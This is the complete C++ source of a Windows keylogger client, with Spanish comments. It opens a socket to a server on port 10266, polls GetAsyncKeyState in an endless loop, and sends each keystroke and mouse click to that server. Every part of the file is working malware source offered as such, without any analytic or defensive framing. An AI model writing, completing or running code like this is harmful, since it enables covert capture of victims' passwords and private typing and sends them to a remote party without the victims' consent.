#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <cstring>
#include "errors.hpp"
#include "connection.hpp"
#pragma comment(lib, "Ws2_32.lib")
#pragma once

#define port 10266

void send_key(SOCKET server,char* i){
    if (send(server,i,14,NULL) < 0){
        closesocket(server);
        WSACleanup();
        std::cout << "no se pudo enviar los keys al server" << std::endl;
        exit(-1);
    }
}

int main()
{
    WSADATA wsadata;
    int r = WSAStartup(MAKEWORD(2, 2), &wsadata);
    if (r != 0)
    {
        WSACleanup();
        error("no se pudo inicializar Windows Socket API", WSAGetLastError());
    }
    SOCKET server = connect_server(port);
    if (server == INVALID_SOCKET)
    {
        WSACleanup();
        closesocket(server);
        error("no hay ningun server al cual conectarse", WSAGetLastError());
    }
    while (true)
    {
        // Pasar por todos los caracteres ASCII
        for (char i = 8; i <= 255; i++)
        {
            // si fue apretado (minimo valor entero)
            if (GetAsyncKeyState(i) == -32767)
            {
                switch (i){
                    case VK_LBUTTON: send_key(server,"{LeftMouse}"); break;
                    case VK_RBUTTON: send_key(server,"{RightMouse}"); break;
                    case VK_CANCEL: send_key(server,"{Cancel}"); break;
                    case VK_MBUTTON: send_key(server,"{CenterMouse}"); break;
                    case VK_BACK: send_key(server,"{Return}"); break;
                    case VK_TAB: send_key(server,"{Tab}"); break;
                    case VK_CLEAR: send_key(server,"{Supr}");  break;
                    case VK_RETURN: send_key(server,"{Enter}"); break;
                    case VK_SHIFT: send_key(server,"{Shift}"); break;
                    case VK_CONTROL: send_key(server,"{Ctrl}"); break;
                    case VK_MENU: send_key(server,"{Alt}"); break;
                    case VK_CAPITAL: send_key(server,"{BloqMayus}"); break;
                    case VK_ESCAPE: send_key(server,"{Escape}"); break;
                    case VK_SPACE: send_key(server," "); break;
                    default: send_key(server,&i); break;
                }
            }
        }
    }
}